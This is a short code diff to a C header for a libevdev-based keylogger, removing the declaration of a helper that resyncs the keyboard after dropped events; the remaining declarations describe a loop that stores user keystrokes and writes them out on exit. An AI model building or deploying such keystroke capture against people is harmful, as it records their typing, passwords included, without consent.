@@ -55,18 +55,6 @@ void end_keylogger(void);
 void log_device(key_package* key_package);
 
 /**
- * Helper function to parse large amounts of incoming events.
- *
- * If the device sends events faster than can be read, the kernel buffers will
- * fill up and the kernel will skip events. This function resyncs the device
- * and updates the internal state before reading events again.
- *
- * @param dev A pointer to a libevdev instance, representing the built-in
- * keyboard
- */
-void handle_syn_dropped(struct libevdev* dev);
-
-/**
  * Runs an infinite loop to store user keystrokes.
  *
  * Can be exited with the `c` key. Upon exit, writes all keys into the
